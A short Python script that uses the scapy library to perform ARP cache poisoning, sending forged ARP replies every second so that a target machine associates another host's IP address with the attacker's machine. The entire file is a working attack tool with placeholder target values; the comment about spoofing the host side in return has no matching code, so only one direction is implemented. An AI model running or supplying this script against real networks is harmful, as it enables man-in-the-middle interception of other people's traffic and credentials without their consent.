import scapy.all as sc
import time


def spoof(target_ip, target_mac, host_ip):
    arp_response = sc.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    sc.send(arp_response, verbose=0)

target_ip = "your target"
target_mac = "your target mac"
host_ip = "who you want to be"


while True:
    # telling the `target` that we are the `host`
    spoof(target_ip, target_mac, host_ip)
    # telling the `host` that we are the `target`
    # sleep for one second
    time.sleep(1)
